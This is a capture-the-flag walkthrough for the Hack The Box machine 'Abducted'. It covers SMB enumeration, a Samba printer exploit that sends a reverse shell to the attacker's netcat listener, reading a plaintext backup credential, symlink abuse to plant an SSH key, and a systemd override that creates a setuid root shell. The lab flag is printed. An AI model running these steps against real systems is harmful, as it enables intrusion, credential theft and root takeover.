# Abducted HTB Medium Machine Writeup

## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.244.177
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-02 16:36 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating Ping Scan at 16:36
Scanning 10.129.244.177 [4 ports]
Completed Ping Scan at 16:36, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:36
Completed Parallel DNS resolution of 1 host. at 16:36, 0.50s elapsed
Initiating SYN Stealth Scan at 16:36
Scanning 10.129.244.177 [1000 ports]
Discovered open port 22/tcp on 10.129.244.177
Discovered open port 445/tcp on 10.129.244.177
Discovered open port 139/tcp on 10.129.244.177
Completed SYN Stealth Scan at 16:36, 2.87s elapsed (1000 total ports)
Initiating Service scan at 16:36
Scanning 3 services on 10.129.244.177
Completed Service scan at 16:36, 11.58s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.244.177.
Initiating NSE at 16:36
Completed NSE at 16:36, 5.25s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Nmap scan report for 10.129.244.177
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-07-02T09:36:51
|_  start_date: N/A
| nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ABDUCTED<00>         Flags: <unique><active>
|   ABDUCTED<03>         Flags: <unique><active>
|   ABDUCTED<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 9s

NSE: Script Post-scanning.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.81 seconds
           Raw packets sent: 1026 (45.120KB) | Rcvd: 1001 (40.052KB)
```
No web service founded
## Automates Emuneration on Samba system
```bash
┌──(jameskaois㉿kali)-[~]
└─$ enum4linux -a 10.129.244.177
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul  2 16:43:56 2026

 =========================================( Target Information )=========================================
                                                                                                           
Target ........... 10.129.244.177                                                                          
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.244.177 )===========================
                                                                                                           
                                                                                                           
[+] Got domain/workgroup name: WORKGROUP                                                                   
                                                                                                           
                                                                                                           
 ===============================( Nbtstat Information for 10.129.244.177 )===============================
                                                                                                           
Looking up status of 10.129.244.177                                                                        
        ABDUCTED        <00> -         B <ACTIVE>  Workstation Service
        ABDUCTED        <03> -         B <ACTIVE>  Messenger Service
        ABDUCTED        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 10.129.244.177 )==================================
                                                                                                           
                                                                                                           
[+] Server 10.129.244.177 allows sessions using username '', password ''                                   
                                                                                                           
                                                                                                           
 ===============================( Getting domain SID for 10.129.244.177 )===============================
                                                                                                           
Domain Name: WORKGROUP                                                                                     
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                       
                                                                                                           
                                                                                                           
 ==================================( OS information on 10.129.244.177 )==================================
                                                                                                           
                                                                                                           
[E] Can't get OS info with smbclient                                                                       
                                                                                                           
                                                                                                           
[+] Got OS info for 10.129.244.177 from srvinfo:                                                           
        ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services                                
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ======================================( Users on 10.129.244.177 )======================================
                                                                                                           
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: scott    Name: Scott Mercer      Desc:                      

user:[scott] rid:[0x3e8]

 ================================( Share Enumeration on 10.129.244.177 )================================
                                                                                                           
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                      

        Sharename       Type      Comment
        ---------       ----      -------
        HP-Reception    Printer   Reception printer
        projects        Disk      Hartley Group Project Files
        transfer        Disk      Staff file transfer
        IPC$            IPC       IPC Service (Hartley Group Document Services)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 10.129.244.177 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.244.177                                                             
                                                                                                           
                                                                                                           
[E] Can't understand response:                                                                             
                                                                                                           
NT_STATUS_NO_SUCH_FILE listing \*                                                                          
//10.129.244.177/HP-Reception   Mapping: N/A Listing: N/A Writing: N/A
//10.129.244.177/projects       Mapping: DENIED Listing: N/A Writing: N/A
//10.129.244.177/transfer       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                             
                                                                                                           
NT_STATUS_CONNECTION_REFUSED listing \*                                                                    
//10.129.244.177/IPC$   Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.129.244.177 )===========================
                                                                                                           
Password:                                                                                                  


[+] Attaching to 10.129.244.177 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] ABDUCTED
        [+] Builtin

[+] Password Info for Domain: ABDUCTED

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                       
                                                                                                           
                                                                                                           
Password Complexity: Disabled                                                                              
Minimum Password Length: 5


 ======================================( Groups on 10.129.244.177 )======================================
                                                                                                           
                                                                                                           
[+] Getting builtin groups:                                                                                
                                                                                                           
                                                                                                           
[+]  Getting builtin group memberships:                                                                    
                                                                                                           
                                                                                                           
[+]  Getting local groups:                                                                                 
                                                                                                           
                                                                                                           
[+]  Getting local group memberships:                                                                      
                                                                                                           
                                                                                                           
[+]  Getting domain groups:                                                                                
                                                                                                           
                                                                                                           
[+]  Getting domain group memberships:                                                                     
                                                                                                           
                                                                                                           
 =================( Users on 10.129.244.177 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                           
                                                                                                           
[I] Found new SID:                                                                                         
S-1-22-1                                                                                                   

[I] Found new SID:                                                                                         
S-1-5-32                                                                                                   

[I] Found new SID:                                                                                         
S-1-5-32                                                                                                   

[I] Found new SID:                                                                                         
S-1-5-32                                                                                                   

[I] Found new SID:                                                                                         
S-1-5-32                                                                                                   

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''  
```
Found:
```
[+] Got OS info for 10.129.244.177 from srvinfo:                                                           
        ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services                                
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
```
Searching online found [CVE-2026-4480](https://github.com/0xBlackash/CVE-2026-4480), [POC](https://github.com/TheCyberGeek/CVE-2026-4480-PoC)
## Exploit Samba
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/abducted]
└─$ python3 exploit.py 10.129.244.177 10.10.15.11 4444 
[*] target   : 10.129.244.177 (\\10.129.244.177\HP-Reception)
[*] callback : 10.10.15.11:4444  (start a listener first: nc -lvnp 4444)
[+] print job submitted -- check your listener / out-of-band channel
```
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.244.177] 38132
bash: cannot set terminal process group (1664): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ id
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```
```bash
┌──(jameskaois㉿kali)-[~]└─$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.15.11] from (UNKNOWN) [10.129.244.177] 38132bash: cannot set terminal process group (1664): Inappropriate ioctl for devicebash: no job control in this shellnobody@abducted:/var/spool/samba$ ididuid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)nobody@abducted:/var/spool/samba$ ls -la /homels -la /hometotal 16drwxr-xr-x 4 root root 4096 Jun 4 13:41 .drwxr-xr-x 23 root root 4096 Jun 4 13:41 ..drwxr-x--- 3 marcus marcus 4096 Jun 4 13:47 marcusdrwxr-x--- 3 scott scott 4096 Jun 4 13:47 scottnobody@abducted:/var/spool/samba$ sudo -lsudo -lsudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helpersudo: a password is requirednobody@abducted:/var/spool/samba$ cat /etc/cronjobcat /etc/cronjobcat: /etc/cronjob: No such file or directorynobody@abducted:/var/spool/samba$ find / -perm -4000 -type f 2>/dev/nullfind / -perm -4000 -type f 2>/dev/null/usr/bin/gpasswd/usr/bin/umount/usr/bin/chfn/usr/bin/fusermount3/usr/bin/newgrp/usr/bin/sudo/usr/bin/mount/usr/bin/su/usr/bin/chsh/usr/bin/passwd/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/polkit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysignnobody@abducted:/var/spool/samba$ ss -tulnpss -tulnpNetid State Recv-Q Send-Q Local Address:Port Peer Address:PortProcessudp UNCONN 0 0 127.0.0.54:53 0.0.0.0:*udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:*udp UNCONN 0 0 10.129.255.255:137 0.0.0.0:*udp UNCONN 0 0 10.129.244.177:137 0.0.0.0:*udp UNCONN 0 0 0.0.0.0:137 0.0.0.0:*udp UNCONN 0 0 10.129.255.255:138 0.0.0.0:*udp UNCONN 0 0 10.129.244.177:138 0.0.0.0:*udp UNCONN 0 0 0.0.0.0:138 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.54:53 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*tcp LISTEN 0 50 0.0.0.0:139 0.0.0.0:*tcp LISTEN 0 4096 0.0.0.0:22 0.0.0.0:*tcp LISTEN 0 50 0.0.0.0:445 0.0.0.0:*tcp LISTEN 0 50 [::]:139 [::]:*tcp LISTEN 0 4096 [::]:22 [::]:*tcp LISTEN 0 50 [::]:445 [::]:*nobody@abducted:/var/spool/samba$ cat /etc/crontabcat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/sh# You can also override PATH, but by default, newer versions inherit it from the environment#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed17 * * * * root cd / && run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }#nobody@abducted:/var/spool/samba$
```
## Get user flag
After emunerating the system, found:
```bash
nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
<clone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
nobody@abducted:/var/spool/samba$ 
```
```bash
scott@abducted:~$ ls
user.txt
scott@abducted:~$ cat user.txt
2ea0c1d8bbfe2f69f3ecf1dab5e67092
scott@abducted:~$ 
```
## Privilege Escalation
```bash
scott@abducted:~$ cat /etc/samba/shares.conf
<SNIP>
[transfer]
comment = Staff file transfer
path = /srv/transfer
valid users = scott
force user = marcus
read only = no
wide links = yes
browseable = yes
scott@abducted:~$ grep -E 'unix extensions|wide links' /etc/samba/smb.conf
unix extensions = no
allow insecure wide links = yes
```
```bash
scott@abducted:~$ ssh-keygen -q -t ed25519 -N '' -f /tmp/k
scott@abducted:~$ ln -s /home/marcus /srv/transfer/mh
scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
-c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
putting file /tmp/k.pub as \mh\.ssh\authorized_keys
scott@abducted:~$ ssh -i /tmp/k marcus@10.129.244.177
```
## Get root flag
```bash
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
marcus@abducted:~$ ls -l /tmp/.rb
-rwsr-xr-x 1 root root 1446024 ... /tmp/.rb
marcus@abducted:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
```
